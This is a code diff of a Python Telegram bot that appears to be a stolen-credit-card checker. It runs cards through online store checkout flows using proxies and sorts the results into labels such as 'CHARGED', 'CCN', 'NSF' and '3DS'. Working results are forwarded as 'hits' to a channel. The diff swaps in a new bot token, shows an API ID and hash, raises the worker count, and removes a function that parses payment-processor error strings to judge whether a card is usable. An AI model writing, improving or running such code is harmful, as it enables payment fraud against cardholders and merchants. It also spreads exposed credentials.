@@ -1,4 +1,4 @@
-﻿import asyncio
+import asyncio
 import aiohttp
 import json
 import re
@@ -28,7 +28,7 @@ import nest_asyncio
 nest_asyncio.apply()
 
 # Configuration
-BOT_TOKEN = "8783552179:AAGZtUgr4AEONHyuNPPZ07na09ZHFwK3EjA"
+BOT_TOKEN = "8435065448:AAF3deY52T_TRETXKPgZnqOaqyfHXzUVlZ4"
 API_ID = 23933044
 API_HASH = "6df11147cbec7d62a323f0f498c8c03a"
 ADMINS = [7125341830]
@@ -38,7 +38,7 @@ HIT_CHANNEL = -1003805693108  # Channel for forwarding hits
 # Constants
 MAX_SITES_PER_USER = 500
 MAX_GLOBAL_SITES = 500
-WORKER_COUNT = 5
+WORKER_COUNT = 15
 
 # Logging setup
 logging.basicConfig(
@@ -165,129 +165,6 @@ book = {
     "DEFAULT": {"address1": "123 Main", "city": "New York", "postalCode": "10080", "zoneCode": "NY", "countryCode": "US", "phone": "2194157586"},
 }
 
-# Response parsing function
-def parse_payment_response(submit_resp, receipt_resp=None):
-    """Parse payment response and return standardized result"""
-    resp_str = json.dumps(submit_resp, default=str)
-    if receipt_resp:
-        resp_str += json.dumps(receipt_resp, default=str)
-    
-    resp_lower = resp_str.lower()
-
-    submit_result = submit_resp.get('data', {}).get('submitForCompletion', {})
-    typename = submit_result.get('__typename', '')
-
-    receipt = submit_result.get('receipt', {})
-    if receipt_resp:
-        receipt = receipt_resp.get('data', {}).get('receipt', {})
-    receipt_type = receipt.get('__typename', '')
-
-    # Extract error message and code from processingError (FailedReceipt)
-    error_msg = ""
-    error_code = ""
-    processing_error = None
-
-    if receipt_type == 'FailedReceipt':
-        processing_error = receipt.get('processingError', {}) or {}
-        error_code = processing_error.get('code', '') or ''
-        error_msg = processing_error.get('messageUntranslated', '') or ''
-    elif typename == 'SubmitRejected':
-        errors = submit_result.get('errors', [])
-        if errors:
-            error_msg = errors[0].get('localizedMessage', '') or ''
-            error_code = errors[0].get('code', '') or ''
-    elif typename == 'SubmitFailed':
-        error_msg = submit_result.get('reason', '') or ''
-
-    # KEYCHAIN Success
-    success_keys = [
-        "Thank you for your purchase!",
-        "Order #",
-        "Your order is confirmed",
-        "CARD_SUCCEEDED",
-        "CARD_APPROVED",
-        "PaymentSucceeded",
-        "PaymentApproved",
-        "PaymentCompleted",
-        "CARD_COMPLETED",
-        "CARD_SUCCESS",
-        "SucceededReceipt",
-        "ApprovedReceipt",
-        "CompletedReceipt",
-        "succeeded",
-        "redirect_url"
-    ]
-    if receipt_type == 'ProcessedReceipt' or any(k in resp_str for k in success_keys):
-        order_id = receipt.get('orderIdentity', {}).get('id', '')
-        return {'success': True, 'status': 'CHARGED', 'message': f'Order: {order_id[-8:]}' if order_id else 'APPROVED', 'is_chargeable': True, 'raw_typename': receipt_type or typename}
-
-    # KEYCHAIN Custom "2FACTOR"
-    twofactor_keys = ["3d_secure_2", "hooks", "CERTIFICATE", "ActionRequiredReceipt"]
-    if receipt_type == 'ActionRequiredReceipt' or any(k in resp_str for k in twofactor_keys):
-        return {'success': False, 'status': '2FACTOR', 'message': '3DS_REQUIRED', 'is_chargeable': True, 'raw_typename': receipt_type or typename}
-
-    # KEYCHAIN Custom "CCN"
-    ccn_keys = [
-        "Security code was not matched by the processor",
-        "INVALID_CVC",
-        "invalid_cvc",
-        "cvc_check",
-        "VERIFICATION_VALUE_INVALID_FOR_CARD_TYPE",
-
-    ]
-    if any(k in resp_str for k in ccn_keys):
-        return {'success': False, 'status': 'Approved ⇾ CCN', 'message': 'CVV_MISMATCH', 'is_chargeable': True, 'raw_typename': receipt_type or typename}
-
-    # KEYCHAIN Retry - Address mismatch
-    retry_keys = [
-        "ZIP code does not match billing address",
-        "Street address and postal code do not match"
-    ]
-    if any(k in resp_str for k in retry_keys):
-        return {'success': False, 'status': 'RETRY', 'message': 'ADDRESS_MISMATCH', 'is_chargeable': None, 'raw_typename': receipt_type or typename}
-
-    # KEYCHAIN Retry - Delivery/shipping issues
-    delivery_error_keys = [
-        "delivery details may have changed",
-        "verify your shipping method",
-        "shipping method and try again",
-        "delivery has changed"
-    ]
-    if any(k.lower() in resp_lower for k in delivery_error_keys):
-        return {'success': False, 'status': 'RETRY', 'message': 'DELIVERY_STALE', 'is_chargeable': None, 'raw_typename': receipt_type or typename}
-
-    # KEYCHAIN Ban
-    ban_keys = ["There was an issue processing your payment"]
-    if any(k in resp_str for k in ban_keys):
-        return {'success': False, 'status': 'BAN', 'message': 'PROCESSING_ISSUE', 'is_chargeable': None, 'raw_typename': receipt_type or typename}
-
-    # KEYCHAIN Failure - Card declined/expired/invalid
-    failure_keys = [
-        "PaymentFailed",
-        "CARD_DECLINED",
-        "FailedReceipt",
-        "Card number is expired",
-        "Card was declined",
-        "Your payment details couldn't be verified",
-        "Payment gateway is invalid",
-        "Your card was declined",
-        "This transaction cannot be processed",
-        "This transaction has been declined"
-    ]
-    if receipt_type == 'FailedReceipt' or any(k in resp_str for k in failure_keys):
-        if "expired" in resp_str.lower():
-            return {'success': False, 'status': 'EXPIRED', 'message': error_msg or 'CARD_EXPIRED', 'is_chargeable': False, 'raw_typename': receipt_type or typename}
-        if "insufficient" in resp_str.lower() or "NSF" in resp_str:
-            return {'success': False, 'status': 'NSF', 'message': error_msg or 'INSUFFICIENT_FUNDS', 'is_chargeable': False, 'raw_typename': receipt_type or typename}
-        return {'success': False, 'status': 'DECLINED', 'message': error_msg or 'CARD_DECLINED', 'is_chargeable': False, 'raw_typename': receipt_type or typename}
-
-    if typename == 'Throttled':
-        return {'success': False, 'status': 'THROTTLED', 'message': 'RATE_LIMITED', 'is_chargeable': None, 'raw_typename': typename}
-
-    if typename in ['ProcessingReceipt', 'WaitingReceipt'] or receipt_type in ['ProcessingReceipt', 'WaitingReceipt']:
-        return {'success': False, 'status': 'RETRY', 'message': 'PROCESSING_TIMEOUT', 'is_chargeable': None, 'raw_typename': receipt_type or typename}
-
-    return {'success': False, 'status': 'UNKNOWN', 'message': error_msg or typename or 'NO_RESPONSE', 'is_chargeable': None, 'raw_typename': typename}
 
 # Helper functions
 def pick_addr(url, cc=None, rc=None):
@@ -1234,7 +1111,7 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
                                 return True, "OTP_REQUIRED", gateway, total_price, currency, receipt_id, order_url
                             
                             elif typename == 'INCORRECT_CVC' or any(k in final_text for k in ccn_keys):
-                                return True, "CCN", gateway, total_price, currency, receipt_id, order_url
+                                return True, "INCORRECT_CVC", gateway, total_price, currency, receipt_id, order_url
                             
                             elif typename == 'INSUFFICIENT_FUNDS':
                                 return True, "INSUFFICIENT_FUNDS", gateway, total_price, currency, receipt_id, order_url
@@ -1262,13 +1139,7 @@ async def process_card(cc, mes, ano, cvv, site_url, user_id, proxy_str=None):
                 if 'WaitingReceipt' in final_text:
                     return False, "Change Proxy or Site", gateway, total_price, currency, receipt_id, order_url
                 
-                # Parse the response using our new parser
-                parsed_response = parse_payment_response(submit_resp=submit_json_data, receipt_resp=receipt_resp_json)
-                
-                if parsed_response['success']:
-                    return True, parsed_response['status'], gateway, total_price, currency, receipt_id, order_url
-                else:
-                    return True, parsed_response['status'], gateway, total_price, currency, receipt_id, order_url
+                                
 
         except Exception as e:
             if attempt < max_retries:
